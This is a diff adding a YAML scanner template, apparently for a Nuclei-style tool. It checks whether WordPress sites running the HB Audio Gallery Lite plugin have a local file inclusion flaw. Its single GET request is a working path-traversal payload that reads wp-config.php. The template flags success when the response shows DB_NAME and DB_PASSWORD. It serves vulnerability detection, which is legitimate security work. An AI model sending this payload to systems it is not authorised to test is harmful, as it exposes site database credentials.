@@ -1,0 +1,28 @@
+id: hb-audio-lfi
+brief:
+    title: Wordpress HB Audio Gallery Lite - Local File Inclusion
+    by: dhiyaneshDK
+    level: high
+    about: Wordpress HB Audio Gallery Lite is vulnerable to local file inclusion.
+    label:
+        - wp
+        - packetstorm
+        - wordpress
+        - wp-plugin
+        - lfi
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/hb-audio-gallery-lite/gallery/audio-download.php?file_path=../../../../wp-config.php&file_size=10'
+      signs:
+        - "on": word
+          has:
+            - DB_NAME
+            - DB_PASSWORD
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
